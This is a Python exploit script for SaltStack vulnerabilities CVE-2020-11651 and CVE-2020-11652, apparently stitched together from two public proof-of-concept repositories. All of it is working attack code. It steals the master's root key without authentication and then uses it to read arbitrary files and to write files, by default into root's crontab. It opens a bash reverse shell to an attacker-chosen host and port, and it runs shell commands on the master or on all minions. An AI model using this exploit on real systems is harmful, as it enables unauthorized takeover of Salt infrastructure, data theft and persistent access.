#BASE https://github.com/sokoban/attack_code_PoC/blob/b56e35040928dad915bc496c6c49616976aad3a1/CVE-2020-11652.py
#BASE https://github.com/dozernz/cve-2020-11651/blob/7de1b876f43fe451a82ec4481045528357b0faae/CVE-2020-11651.py
from __future__ import absolute_import, print_function, unicode_literals
import argparse
import os
import sys

import salt
import salt.version
import salt.transport.client
import salt.exceptions

DEBUG = False

def init_minion(master_ip, master_port):
    minion_config = {
        'transport': 'zeromq',
        'pki_dir': '/tmp',
        'id': 'root',
        'log_level': 'debug',
        'master_ip': master_ip,
        'master_port': master_port,
        'auth_timeout': 5,
        'auth_tries': 1,
        'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port)
    }

    return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear')

def check_salt_version():
    print("[+] Salt version: {}".format(salt.version.__version__))

    vi = salt.version.__version_info__

    if (vi < (2019, 2, 4) or (3000,) <= vi < (3000, 2)):
       return True
    else:
       return False

def check_connection(master_ip, master_port, channel):
    print("[+] Checking salt-master ({}:{}) status... ".format(master_ip, master_port), end='')
    sys.stdout.flush()
    try:
      channel.send({'cmd':'ping'}, timeout=2)
    except salt.exceptions.SaltReqTimeoutError:
      print("OFFLINE")
      sys.exit(1)

def check_CVE_2020_11651(channel):
    print("\n[+] Read root_key... ", end='')
    sys.stdout.flush()
    # try to evil
    try:
      rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3)
    except salt.exceptions.SaltReqTimeoutError:
      print("YES")
    except:
      print("ERROR")
      raise
    else:
        pass
    finally:
      if rets:
        root_key = rets[2]['root']
        return root_key

    return None

def pwn_read_file(channel, root_key, path, master_ip):
    # print("[+] Attemping to read {} from {}".format(path, master_ip))
    sys.stdout.flush()

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.read',
        'path': path,
        'saltenv': 'base',
    }

    rets = channel.send(msg, timeout=3)
    print(rets['data']['return'][0][path])

def pwn_upload_file(channel, root_key, src, dest, master_ip):
    print("[+] Attemping to upload {} to {} on {}".format(src, dest, master_ip))
    sys.stdout.flush()

    try:
        fh = open(src, 'rb')
        payload = fh.read()
        fh.close()
    except Exception as e:
        print('Failed to read {}: {}'.format(src, e))
        return

    msg = {
        'key': root_key,
        'cmd': 'wheel',
        'fun': 'file_roots.write',
        'saltenv': 'base',
        'data': payload,
        'path': dest,
    }

    rets = channel.send(msg, timeout=3)
    print(rets['data']['return'])

def pwn_getshell(channel, root_key, LHOST, LPORT):
    msg = {"key":root_key,
          "cmd":"runner",
          'fun': 'salt.cmd',
          "kwarg":{
              "fun":"cmd.exec_code",
              "lang":"python3",                
              "code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);".format(LHOST, LPORT)
              },
          'jid': '20200504042611133934',
          'user': 'sudo_user',
          '_stamp': '2020-05-04T04:26:13.609688'}

    try:
        response = channel.send(msg,timeout=3)
        print("Got response for attempting master shell: "+str(response)+ ". Looks promising!")
        return True
    except:
        print("something failed")
        return False

def pwn_exec(channel, root_key, exec_cmd, master_or_minions):
    if master_or_minions == "master":
        msg = {"key":root_key,
            "cmd":"runner",
            'fun': 'salt.cmd',
            "kwarg":{
                "fun":"cmd.exec_code",
                "lang":"python3",
                "code":"import subprocess;subprocess.call('{}',shell=True)".format(exec_cmd)
                },
            'jid': '20200504042611133934',
            'user': 'sudo_user',
            '_stamp': '2020-05-04T04:26:13.609688'}

        try:
            response = channel.send(msg,timeout=3)
            print("Got response for attempting master shell: "+str(response)+ ". Looks promising!")
            return True
        except:
            print("something failed")
            return False

    if master_or_minions == "minions":
        print("Sending command to all minions on master")
        jid = "{0:%Y%m%d%H%M%S%f}".format(datetime.datetime.utcnow())
        cmd = "/bin/sh -c '{0}'".format(exec_cmd)

        msg = {'cmd':"_send_pub","fun":"cmd.run","arg":[cmd],"tgt":"*","ret":"","tgt_type":"glob","user":"root","jid":jid}

        try:
            response = channel.send(msg,timeout=3)
            if response == None:
                return True
            else:
                return False
        except:
            return False


def main():
    parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652')
    parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1')
    parser.add_argument('--port', '-p', dest='master_port', default='4506')
    parser.add_argument('--shell-LHOST', '-lh', dest='Remote_listen_host')
    parser.add_argument('--shell-LPORT', '-lp', dest='Remote_listen_ip')
    parser.add_argument('--exec-choose', '-c', dest='master_or_minions')
    parser.add_argument('--exec-cmd', '-e', dest='exec_cmd')
    parser.add_argument('--read', '-r', dest='read_file')
    parser.add_argument('--upload-src', dest='upload_src')
    parser.add_argument('--upload-dest', dest='upload_dest', default='/var/spool/cron/crontabs/root')
    parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true')
    args = parser.parse_args()

    if args.debug:
        DEBUG = True

    channel = init_minion(args.master_ip, args.master_port)

    check_connection(args.master_ip, args.master_port, channel)
    
    root_key = check_CVE_2020_11651(channel)
    if root_key:
        print('root key: {}'.format(root_key))
    else:
        print('[-] Failed to find root key...')
        sys.exit(127)

    if args.read_file:
        pwn_read_file(channel, root_key, args.read_file, args.master_ip)

    if args.upload_src:
        pwn_upload_file(channel, root_key, args.upload_src, args.upload_dest, args.master_ip)

    if args.Remote_listen_host:
        pwn_getshell(channel, root_key, args.Remote_listen_host, args.Remote_listen_ip)

    if args.master_or_minions:
        pwn_exec(channel, root_key, args.exec_cmd, args.master_or_minions)


if __name__ == '__main__':
    main()